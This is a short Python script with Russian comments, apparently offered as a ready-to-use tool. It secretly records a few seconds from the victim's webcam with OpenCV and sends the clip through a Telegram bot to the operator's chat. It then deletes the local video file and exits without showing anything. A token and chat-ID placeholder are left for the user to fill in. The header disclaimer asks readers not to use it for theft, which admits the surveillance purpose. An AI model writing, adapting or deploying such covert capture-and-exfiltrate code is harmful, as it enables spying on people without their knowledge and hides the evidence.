#Дисклеймер: не будь мразью, не используй его для похищения чего-либо
#Вся ответственность будет на вас.
import cv2, telebot, os #1. cam 2. telegram 3. del file
from time import sleep #очевидно
from telebot import types #telegram
from threading import Thread #2-й поток
bot = telebot.TeleBot('ваш токен')#токен можно получить у @BotFather
gg = 1         #
def g():       #
    global gg  #  все это - костыли
    sleep(2.5) #
    gg = 0     #
cap = cv2.VideoCapture(0)#вебка
codec = cv2.VideoWriter_fourcc(*'XVID')#кодек
out = cv2.VideoWriter('g.avi',codec, 30.0, (640,480))#название, кодек, фпс, разрешение
while gg == 1:
    th = Thread(target=g)#создание потока
    th.start()#старт потока
    ret, img = cap.read()#изображение
    out.write(img)
    cv2.waitKey(1)
cap.release()#завершение камеры
out.release()#завершение записи
img = open('g.avi', 'rb')#открытие файла с записью
bot.send_video('ваш id в telegram', img, None, 'Видосик')#отправка сообщения в лс Вам
img.close()#закрытие файла
os.remove(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'g.avi'))#удаление видео
raise SystemExit(1)#закрытие программы
